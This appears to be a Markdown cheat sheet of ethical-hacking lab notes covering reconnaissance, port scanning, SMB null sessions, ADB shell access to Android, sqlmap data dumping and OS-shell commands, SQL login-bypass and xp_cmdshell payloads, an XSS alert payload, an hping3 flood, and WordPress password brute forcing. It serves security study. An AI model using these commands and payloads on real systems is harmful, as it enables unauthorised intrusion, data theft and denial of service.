## Footprinting and Reconnaissance
<details>
    <summary> Reconnasiance/Footprinting</summary>
<details>
    <summary> 1) Windows CLI tools </summary>

```bash
$ ping <ip>
 or 
$ ping www.domain.com
```
````console
$ ping <host-ip> -f -l 1300
````
```bash
$ nslookup <domain.com>
```
```bash
$ tracert <doamin>

$ traceroute <host-ip>
```
</details>


### 2)Edit,Debug and monitor
<details>
    <summary> 2)Firebug </summary>
    
- Firebug extension Integrated with Firefox
  
</details>

### 3)Mirroring website:
<details>
    <summary> Mirroring</summary>
    
- Windows: HTTrack

- Linux: wget
```bash
 $ wget <url-of-website>
``` 
#### Note:- check wget -h for options

</details>

### 4)Advance route tracing 
#### Tool: Path Analyzer Pro

<details>
    <summary> 5)Information Gathering Using Metasploit</summary>

#### Extract accurate information about a network using Metasploit Framework.

```bash
$ service postgresql start
```
```bash
In msf type 
$db_status
```
If error then exit and type below commands
- To initialize database
```
$ msfdb init
```
```
$ service postgresql start
```
relaunch metasploit Framework
```
$ msfconsole
$ db_status
$ nmap -Pn -sS -A -oX <output_file> <subnet(xx.xx.xx.x/24)>
```
you can use different options and also remove some options
```
$ hosts
```
to get host information

```
$ use auxilliary/scanner/smb/smb_version
or 
$ use /scanner/smb/smb_version
$ show options
$ set RHOSTS xx.xx.xx.8-16
$ set THREADS 1000
$ run 
```
- Now you can see the os_flavor 
- Hence Extracted information about network using metasploit
</details>
</details>

## Scanning Networks
<details>
    <summary>Scanning Networks</summary
- Port Scanning using Hping3:

```bash
hping3 --scan 1-3000 -S 10.10.10.10
```
--scan parameter defines the port range to scan and –S represents SYN flag.

- Pinging the target using HPing3:
```
hping3 -c 3 10.10.10.10
```
-c 3 means that we only want to send three packets to the target machine.

- UDP Packet Crafting
```
hping3 10.10.10.10 --udp --rand-source --data 500
```
- TCP SYN request
```
hping3 -S 10.10.10.10 -p 80 -c 5
```
-S will perform TCP SYN request on the target machine, -p will pass the traffic through which port is assigned, and -c is the count of the packets sent to the Target machine.

- HPing flood
```
hping3 10.10.10.10 --flood
``` 
</details>


## Enumeration
<details>
    <summary>Enumeration</summary>

 ### 1) NetBios Enumeration
#### Tool: Global Network Inventory
- Audit Scan Mode >> Select IP range >> Authentication setting >> connect as windows 12(victim) server using credentials that is currently logged on
- The Scan Summary tab displays a brief summary of machine that has been scanned. It will shows you the Machine name, MAC Address, OS installed, and etc.
- User groups,Services,Installed Softwares etc can be seen in the scan summmary.
  
### 2) Network Resources
#### Tool: Advanced IP Scanner  
- Enumerate network resources using Advanced IP Scanner.
- Perform a system ard network scan, Enumerate user accounts, Execute remotepenetration, Gather information about local network
- Input range of IP
- Now you have the IP address, Name, MAC address, and Manufacturer information of the victim machine.

### 3) Network enum using superscan
#### Tool: Superscan
- Lists of computers that belong to a domain
- Lists Of shares on the individual hosts on the network
- Policies and passwords
- Enter hostname/IP/URL >> select Enumeration type >> and see the scan result for required information.

### 4) Resurces in Local machine
#### Tool: Hyena
- Click '+' node of local workstation to expand section.
- select different nodes to view their information
- Users, Services, User Rights, Scheduled jobs

 ### 5) SMB ENumeration
#### Tools: nbstat,nmap

- In windows 12
```bash
nmap -O <win-12-ip>
```

```bash
nbstat -A xx.xx.xx.xx  //perform nbstat scan on port 139 in cmd
net use
net use \\xx.xx.xx.xx\e ""\user:""
net use \\xx.xx.xx.16\e""/user:""  //create null session 
// xx.xx.xx.16 is windows server 16
```
- disconnect drive Z
-this creates a null session 
- confirm by using
```bash
net use // session with name e would have been created
```


##### Note: Your first target is the computer with a Windows OS on which you can see ports 139 and 445 open. Remember, this usually works only against Windows but may partially succeed if other OSs have these ports open. There may be more than one system with NetBIOS open. You see that ports 135. 139.445. etc. are open and port 139 is using NetBIOS.

  ### 6) Some other tools
#### Tools:
- NetBIOS Enumerator
- SoftPerfect Network Scanner

</details>

## Vulberability Analysis
<details>
    <summary>Vulnerability Analysis</summary>

### Nessus Vulnerability Scanner
-
```bash

```
### Nikto
-
```bash
nikto -h url -Cgidirs all
```
</details>

## Android Hacking
<details>
    <summary>ADB</summary>
    
```bash
netdiscover -r xx.xx.xx.xx/24
nmap -O xx.xx.xx.4
apt-get update
apt-get install adb -y
```

- Use
```bash
adb devices -l
adb connect xx.xx.xx.4:5555 //5555 is port of android discovered in 'nmap -O' scan
adb shell // 'To get shell access'
```
- You can run commands like

```bash
pwd
cd
ls
echo
```
#### Download a File from Android using ADB tool
```bash
adb pull /sdcard/log.txt C:
adb pull sdcard/log. txt /home/murphy/Desktop
```
</details>

## SQL Injection

<details>
    <summary>SQL Injection</summary>
    
- ### SQLMAP Extract DBS
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
```
- ### Extract Tables
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
```
- ### Extract Columns
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
```
- ### Dump Data
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
```
- ### OS Shell to execute commands
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
```
- ### Login bypass
```bash
blah' or 1=1 --
Insert data into DB from login
blah';insert into login values ('john','apple123');
Create database from login
blah';create database mydatabase;
Execute cmd from login
blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
```
</details>

## Web Application Hacking
<details>
    <summary> Web Hacking</summary>
    
### 1) Parameter Tampering
    - Changing ?id=1 or 2 or 3 to switch user.
### 2) XSS
      - In cotactact us page i the commrent section post the following script `<script>alert("You are Hacked")</script>`

### 3) WPScan
- SkipFish : Active Recon for Websites 
  
```console
skipfish -o 202 http://192.168.1.202/wordpress
```

- Wordpress Site Login BruteForce [Step-By-Step](https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/)
  
```shell
# Wordpress site only Users Enumeration
wpscan --url http://example.com/ceh --enumerate u 

# Direct crack if we have user/password details

wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Using Metaspoilt
msfdb init && msfconsole
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file user.txt
msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
msf auxiliary(wordpress_login_enum) > exploit
  
  
```
</details>
